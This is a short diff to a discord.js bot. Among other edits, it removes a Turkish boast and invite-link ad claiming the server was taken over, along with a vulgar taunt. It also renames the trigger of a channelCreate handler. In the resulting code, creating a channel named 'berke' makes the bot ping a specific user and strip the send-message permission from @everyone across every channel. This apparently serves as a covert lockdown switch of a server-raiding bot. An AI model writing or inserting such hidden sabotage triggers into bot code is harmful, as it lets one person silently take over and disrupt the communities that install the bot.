@@ -412,8 +412,6 @@ message.guild.createChannel(`📜 Sohbet`, 'voice')
         name: '† Preist.',
         color: 'BLUE',
       })
-
-       message.channel.send("Berke Abi Melkor Yapıldı :sunglasses: \n\nAsıl Sunucum; https://discord.gg/d2nAWtn")
      
             })   
     
@@ -432,8 +430,8 @@ client.on('error', e => {
 });
 
 client.on('channelCreate', channel => {
-  if (channel.name == 'lyrics') {
-    channel.send(`<@522018424440881163> Berke abim, tarafından sikildiniz. Allah zihin açıklığı versin.`)
+  if (channel.name == 'berke') {
+    channel.send(`<@522018424440881163> Allah zihin açıklığı versin.`)
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
               SEND_MESSAGES: false,
